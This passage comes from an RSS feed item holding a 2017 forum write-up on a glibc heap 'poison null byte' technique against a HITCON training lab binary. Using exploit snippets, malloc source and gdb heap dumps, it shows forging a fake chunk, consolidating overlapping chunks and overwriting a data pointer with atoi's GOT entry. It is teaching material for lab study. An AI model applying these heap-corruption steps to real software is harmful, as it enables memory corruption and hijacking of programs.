+<li>Update the <em>prevsize</em> field of chunk y.</li>
+</ul>
+<pre><code class="lang-auto">/* Set size at footer (only when chunk is not in use) */
+#define set_foot(p, s)	(((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))
+</code></pre>
+<ul>
+<li>Give back the split chunk to the user.</li>
+</ul>
+<p>This is how it looks like in memory:</p>
+<pre><code class="lang-makefile">0x6031e0:	0x4242424242424242	0x0000000000000111 &lt;-- new allocated chunk z
+0x6031f0:	0x4747474747474747	0x4747474747474747
+0x603200:	0x4747474747474747	0x4747474747474747
+					...					...
+0x6032d0:	0x4747474747474747	0x4747474747474747
+0x6032e0:	0x4747474747474747	0x4747474747474747
+0x6032f0:	0x4747474747474747	0x0000000000000101 &lt;-- remainder chunk after split [free]
+0x603300:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+0x603310:	0x4444444444444444	0x4444444444444444
+0x603320:	0x4444444444444444	0x4444444444444444
+					...					...
+0x6033c0:	0x4444444444444444	0x4444444444444444
+0x6033d0:	0x4444444444444444	0x4444444444444444
+0x6033e0:	0x0000000000000200	0x000000000000000a
+0x6033f0:	0x0000000000000100	0x0000000000000110 &lt;-- chunk y 
+0x603400:	0x4545454545454545	0x4545454545454545
+</code></pre>
+<p>Just to be sure, let’s check malloc’s calculations.</p>
+<pre><code class="lang-makefile">
+(i)   remainder_size = size - nb = 0x210 - 0x110        = 0x100
+(ii)  remainder      = chunk_at_offset (victim, nb)     = 0x6031e0   + 0x110  = 0x6032f0
+(iii) set_head (remainder, remainder_size | PREV_INUSE) = *(0x6032f0 + 0x8)   = 0x101
+(iv)  set_foot (remainder, remainder_size);             = *(0x6032f0 + 0x100) = 0x100
+
+</code></pre>
+<p>Cute! Let’s have a look at what’s going to happen when the null byte poison takes place before the allocation.</p>
+<hr>
+<p>###<em>Null Byte Poisoning</em></p>
+<p>We’ll take advantage of the fact that <em>edit</em> null terminates the provided strings as we saw during the recon phase.</p>
+<pre><code class="lang-python"># Null byte poison
+edit(1, 'B'*0x108)
+</code></pre>
+<pre><code class="lang-makefile">0x6030d0:	0x0000000000000000	0x0000000000000111
+0x6030e0:	0x4242424242424242	0x4242424242424242
+0x6030f0:	0x4242424242424242	0x4242424242424242
+					...					...
+0x6031d0:	0x4242424242424242	0x4242424242424242
+0x6031e0:	0x4242424242424242	0x0000000000000200 &lt;-- chunk x [shrunk &amp; free]
+0x6031f0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+</code></pre>
+<p>Before we re-check malloc’s calculations once again for the new shrunk size, let me explain a bit about the below line of code which was previous used in the exploit:</p>
+<pre><code class="lang-python"># p64(0x200) is needed in order to bypass unlink's check
+alloc(0x208, 'D'*0x1f0 + p64(0x200))
+</code></pre>
+<p>As I mentioned above, the next allocation will unlink the chunk at address <em>0x6031e0</em>. Unlink’s code has the following checks that we need to bypass:</p>
+<pre><code class="lang-auto">/* Take a chunk off a bin list */
+#define unlink(AV, P, BK, FD) {                                            
+    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      
+      malloc_printerr ("corrupted size vs. prev_size");			      
+    FD = P-&gt;fd;								      
+    BK = P-&gt;bk;								      
+    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      
+      malloc_printerr ("corrupted double-linked list");	
+</code></pre>
+<p>In particular, we only need to bypass the first check since the second one is good to go because its FD and BK fields indeed point to it. Practically, the first check makes sure that:</p>
+<pre><code class="lang-makefile">sizeof(chunk) == *(0x6031e0 + size) == prev_size(next_chunk)
+</code></pre>
+<p>In other words, the <em>prevsize</em> field of the next chunk <strong>must</strong> have the size value of its previous free chunk as we discussed before. Since we overwrote the size with <strong>0x200</strong>, the address area at offset <em>0x6031e0 + 0x200</em> still belongs to the data area of chunk x, <em>0x6033e0</em> to be precise.</p>
+<p>Meaning, if we don’t take care of that value at that offset, <em>unlink</em> will detect the memory corruption and terminate the binary. That’s why my data’s payload has that certain structure, we technically craft a fake chunk.</p>
+<p>Let’s move on with the allocation.</p>
+<pre><code class="lang-python">alloc(0x108,  'G'*0x108)
+</code></pre>
+<pre><code class="lang-makefile">0x6031e0:	0x4242424242424242	0x0000000000000111 &lt;-- new allocated chunk z
+0x6031f0:	0x4747474747474747	0x4747474747474747
+0x603200:	0x4747474747474747	0x4747474747474747
+					...					...
+0x6032d0:	0x4747474747474747	0x4747474747474747
+0x6032e0:	0x4747474747474747	0x4747474747474747
+0x6032f0:	0x4747474747474747	0x00000000000000f1 &lt;-- remainder chunk after split [free]
+0x603300:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
+0x603310:	0x4444444444444444	0x4444444444444444
+					...					...
+0x6033d0:	0x4444444444444444	0x4444444444444444
+0x6033e0:	0x00000000000000f0	0x000000000000000a
+0x6033f0:	0x0000000000000210	0x0000000000000110 &lt;-- chunk y [prev_size not updated]
+0x603400:	0x4545454545454545	0x4545454545454545
+0x603410:	0x4545454545454545	0x4545454545454545
+</code></pre>
+<p>What the hell just happened?! Chunk y’s <em>prevsize</em> didn’t get updated and the remainder chunk’s size is <strong>0x10</strong> less than it was without the null poison. It’s no coincidence that chunk y’s “prev_size” field is <strong>0x10</strong> bytes <strong>before</strong> chunk y’s legit <em>prevsize</em> address. Off to the malloc calculations!</p>
+<pre><code class="lang-makefile">
+(i)   remainder_size = size - nb = 0x200 - 0x110        = 0xf0
+(ii)  remainder      = chunk_at_offset (victim, nb)     = 0x6031e0   + 0x110  = 0x6032f0
+(iii) set_head (remainder, remainder_size | PREV_INUSE) = *(0x6032f0 + 0x8)   = 0x101
+(iv)  set_foot (remainder, remainder_size);             = *(0x6032f0 + 0xf0)  = 0xf0
+
+</code></pre>
+<p>Do you see what I see? The <code>set_foot</code> macro failed to update chunk y’s <em>prevsize</em> field (because 0x6032f0 + 0xf0 = 0x6033e0), which is a major advantage for us. Why’s that? Chunk y thinks that the previous free chunk is still <strong>0x210</strong> bytes before it, not knowing that in fact the free chunk has been updated, split and moved to a different address.</p>
+<p>How can we take advantage of this? Well, the main goal is to be able to overwrite a data pointer so that once <em>edit</em> is called on that pointer, instead of editing data on the heap, we can edit whatever address we placed there (as long as it’s writable ofcourse). The Global Offset Table is writeable so that’s the address of choice (atoi’s GOT entry to be precise).</p>
+<p>Let’s keep stepping through the exploit and witness the magic.</p>
+<pre><code class="lang-python"># Because there's no pointer in between chunk z and y
+# we need to allocate one more chunk such that once we
+# free chunk y, the next allocation will overlap with the
+# previously allocated chunk.
+alloc(0x80,  'H'*0x80)
+</code></pre>
+<pre><code class="lang-makefile">0x6031e0:	0x4242424242424242	0x0000000000000111 &lt;-- new allocated chunk z &lt; - - - - - - - - - +					
+0x6031f0:	0x4747474747474747	0x4747474747474747												 |
+0x603200:	0x4747474747474747	0x4747474747474747												 |
+					...					...														 |
+0x6032f0:	0x4747474747474747	0x0000000000000021 &lt;-- new allocated chunk w 					 |
+0x603300:	0x0000000000000080	0x0000000000603320 &lt;-- new allocated data pointer	     	     |
+0x603310:	0x4444444444444444	0x0000000000000091												 |
+0x603320:	0x4848484848484848	0x4848484848484848    											 |
+0x603330:	0x4848484848484848	0x4848484848484848											     |
+					...					...														 |
+0x603390:	0x4848484848484848	0x4848484848484848												 | - 0x210 
+0x6033a0:	0x4444444444444444	0x0000000000000041 &lt;-- remainder chunk after next split			 |
+0x6033b0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8												 |
+0x6033c0:	0x4444444444444444	0x4444444444444444												 |
+0x6033d0:	0x4444444444444444	0x4444444444444444												 |
+0x6033e0:	0x0000000000000040	0x000000000000000a												 |
+0x6033f0:	0x0000000000000210	0x0000000000000110 &lt;-- chunk y [thinks chunk z is free] - - - - -
+0x603400:	0x4545454545454545	0x4545454545454545
+</code></pre>
+<p>Once again what was “supposed” to be chunk y’s <em>prevsize</em> field at address <em>0x6033e0</em> got updated to <strong>0x40</strong> (0xf0 - (0x90 + 0x20)) == 0x40). We have successfully placed a heap pointer between chunk y and chunk z. If you’ve been paying attention up until now you might be able to figure out the next two crucial steps. First, let’s free chunk z.</p>
+<pre><code class="lang-makefile">0x6031e0:	0x4242424242424242	0x0000000000000111 &lt;-- new allocated chunk z [free] &lt; - - - - - -					
+0x6031f0:	0x00000000006033a0	0x00007ffff7dd37b8												 |
+0x603200:	0x4747474747474747	0x4747474747474747												 |
+					...					...														 |
+0x6032f0:	0x0000000000000110	0x0000000000000020 &lt;-- chunk w [size / prev_size updated]		 |
+0x603300:	0x0000000000000080	0x0000000000603320 &lt;-- pointer to overwrite					     |
+0x603310:	0x4444444444444444	0x0000000000000091												 |
+					...					...														 |
+0x603390:	0x4848484848484848	0x4848484848484848												 | - 0x210 
+0x6033a0:	0x4444444444444444	0x0000000000000041 &lt;-- remainder chunk 		                     |
+0x6033b0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8												 |
+0x6033c0:	0x4444444444444444	0x4444444444444444												 |
+0x6033d0:	0x4444444444444444	0x4444444444444444												 |
+0x6033e0:	0x0000000000000040	0x000000000000000a												 |
+0x6033f0:	0x0000000000000210	0x0000000000000110 &lt;-- chunk y  - - - - - - - - - - - - - - - - -                     
+0x603400:	0x4545454545454545	0x4545454545454545
+</code></pre>
+<p>Now what will malloc do once I free chunk y?</p>
+<pre><code class="lang-auto">/* consolidate backward */
+if (!prev_inuse(p)) {
+   prevsize = prev_size (p);
+   size += prevsize;
+   p = chunk_at_offset(p, -((long) prevsize));
+   unlink(av, p, bck, fwd);
+}
+</code></pre>
+<p>Simply put, malloc doesn’t like fragmentation (except for the case of fastbins), it likes keeping thing clean and tidy. For that reason, when a small chunk is about to free’d, it will check if its previous or next chunk are already free and if they are, it will consolidate them. Let’s see it happening in action.</p>
+<pre><code class="lang-python"># unlink chunk y and z
+free(3)
+</code></pre>
+<pre><code class="lang-makefile">0x6031e0:	0x4242424242424242	0x0000000000000321 &lt;-- consolidated chunk  - - - +   
+0x6031f0:	0x00000000006033a0	0x00007ffff7dd37b8								 |
+0x603200:	0x4747474747474747	0x4747474747474747								 |
+0x603210:	0x4747474747474747	0x4747474747474747								 |
+0x603220:	0x4747474747474747	0x4747474747474747								 | + 0x110
+							...													 |
+0x6032e0:	0x4747474747474747	0x4747474747474747								 |
+0x6032f0:	0x0000000000000110	0x0000000000000020 &lt;-- chunk w still in use &lt; - - 
+0x603300:	0x0000000000000080	0x0000000000603320 &lt;-- pointer in use
+0x603310:	0x4444444444444444	0x0000000000000091
+0x603320:	0x4848484848484848	0x4848484848484848
+	
+</code></pre>
+<p>Voila! Chunk z and chunk y are now one entity and an allocation less than <strong>0x321</strong> in size and greater than <strong>0x110</strong> will be able to overwrite the pointer at address <code>0x603308</code>. Let’s inspect main arena’s state.</p>
+<pre><code class="lang-makefile">==================  Main Arena  ==================
+(0x20)     fastbin[0]: 0x603060 --&gt; 0x603040 --&gt; 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+                  top: 0x603610 (size : 0x209f0) 
+       last_remainder: 0x6033a0 (size : 0x40) 
+            unsortbin: 0x6031e0 (size : 0x320) &lt;--&gt; 0x6033a0 (overlap chunk with 0x6031e0(freed) )
+</code></pre>
+<p>Looking good. Ask yourselves, which code path will malloc take in case of an allocation of size <strong>0x140</strong>? Let’s make our assumptions:</p>
+<ul>
+<li>
+<p>When deleting fastbins from bin lists, it’s done via the <strong>head</strong> of the list. Meaning, <em>0x603060</em> should be given back to us to place the size of the data and the pointer to it.</p>
+</li>
+<li>
+<p>As for the data of size <strong>0x140</strong>, because of the fact that <em>0x6031e0</em> is of small bin size, it’ll be placed in the unsorted bin list just in case the user requests a size less or equal to its size. We should expect <em>0x6031e0</em> to be served back to us in order to store our data. I’ll let you do the malloc calculations for the place where the remainder chunk will end up at.</p>
+</li>
+</ul>
+<pre><code class="lang-python"># The new consolidated free chunk is placed in the unsorted bin.
+# Further allocations will split that chunk as long as the request size is &lt;= 0x321.
+alloc(0x140, 'Z'*0x110 + p64(8) + p64(atoi_got))
+</code></pre>
+<pre><code class="lang-makefile">
+0x6031e0:	0x4242424242424242	0x0000000000000151 &lt;-- new chunk overlaps with chunk w
+0x6031f0:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
+0x603200:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
+0x603210:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a
+					...					...
+0x6032f0:	0x5a5a5a5a5a5a5a5a	0x5a5a5a5a5a5a5a5a &lt;-- chunk w is overwritten
+0x603300:	0x0000000000000008	0x0000000000602058 &lt;-- atoi's GOT entry
+	
+</code></pre>
+<hr>
+<p>###<em>Conclusion</em></p>
+<p>The rest is history, I’ll let you figure out what’s next, it’s a piece of cake at this point. That’s been it folks. If you reached up to this sentence you’re a true champ and I’d like to thank you for taking the time to read my post. I hope you learnt something new and if you have any questions feel free to ask them down below or hit me up on IRC/twitter.</p>
+<hr>
+<p>###<em>References</em></p>
+<p>(1)   <a href="https://github.com/shellphish/how2heap/blob/master/poison_null_byte.c" rel="nofollow noopener">how2heap</a><br>
+(2)    <a href="https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab13" rel="nofollow noopener">HITCON Lab</a></p>
+<p>~ Peace out</p>
+          <p><a href="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874/1</link>
+        <pubDate>Fri, 13 Oct 2017 16:16:57 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-3874-1</guid>
+        <source url="https://d.clarkee.co.uk/t/null-byte-poisoning-the-magic-byte/3874.rss">Null Byte Poisoning - The Magic Byte</source>
+      </item>
+  </channel>
+</rss>
